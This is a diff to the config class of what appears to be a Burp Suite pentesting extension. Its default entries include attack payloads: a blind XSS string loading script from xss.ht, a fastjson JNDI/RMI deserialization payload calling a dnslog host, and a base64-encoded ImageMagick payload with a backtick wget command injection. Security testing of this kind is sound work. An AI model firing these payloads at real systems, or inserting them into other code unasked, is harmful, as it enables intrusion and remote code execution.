@@ -31,6 +31,8 @@ public class ConfigTableModel extends AbstractTableModel{
 		configEntries.add(new ConfigEntry("SQLMap-SQLMap.py-Path","",ConfigEntry.Config_Basic_Variable,false,false));
 		configEntries.add(new ConfigEntry("SQLMap-Request-File-Path","D:\\sqlmap-request-files",ConfigEntry.Config_Basic_Variable,true,false));
 		configEntries.add(new ConfigEntry("SQLMap-Options","--risk=3 --level=3",ConfigEntry.Config_Basic_Variable,true,false));
+		
+		configEntries.add(new ConfigEntry("Nmap-File-Path","D:\\Program Files (x86)\\Nmap\\nmap.exe",ConfigEntry.Config_Basic_Variable,true,false));
 
 		configEntries.add(new ConfigEntry("Chunked-Length", "10",ConfigEntry.Config_Chunked_Variable,true,false));
 		configEntries.add(new ConfigEntry("Chunked-AutoEnable", "",ConfigEntry.Config_Chunked_Variable,false,false));
@@ -48,8 +50,9 @@ public class ConfigTableModel extends AbstractTableModel{
 		configEntries.add(new ConfigEntry("User-Agent", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=bit.0y0.link/%host>",ConfigEntry.Action_Append_To_header_value,true));
 		configEntries.add(new ConfigEntry("knife", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=bit.0y0.link/%host>",ConfigEntry.Action_Add_Or_Replace_Header,true));
 
-		configEntries.add(new ConfigEntry("CRLF", "//%0d%0a/http://www.baidu.com",ConfigEntry.Config_Custom_Payload,true));
+		configEntries.add(new ConfigEntry("fastjson", "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://%host.fastjson.test.dnslog.com/evil\",\"autoCommit\":true}",ConfigEntry.Config_Custom_Payload,true));
 		
+		configEntries.add(new ConfigEntry("Imagemagick","cHVzaCBncmFwaGljLWNvbnRleHQNCnZpZXdib3ggMCAwIDY0MCA0ODANCmltYWdlIG92ZXIgMCwwIDAsMCAnaHR0cHM6Ly9pbWFnZW1hZ2ljLmJpdC4weTAubGluay94LnBocD94PWB3Z2V0IC1PLSAlcyA+IC9kZXYvbnVsbGAnDQpwb3AgZ3JhcGhpYy1jb250ZXh0",ConfigEntry.Config_Custom_Payload_Base64,true));
 
 	}
 
@@ -76,10 +79,19 @@ public class ConfigTableModel extends AbstractTableModel{
 	}
 
 
-	public String getConfigByKey(String key) {
+	public String getConfigValueByKey(String key) {
 		for (ConfigEntry entry:configEntries) {
 			if (entry.getKey().equals(key) && entry.isEnable()) {
 				return entry.getValue();
+			}
+		}
+		return null;
+	}
+	
+	public String getConfigTypeByKey(String key) {
+		for (ConfigEntry entry:configEntries) {
+			if (entry.getKey().equals(key) && entry.isEnable()) {
+				return entry.getType();
 			}
 		}
 		return null;
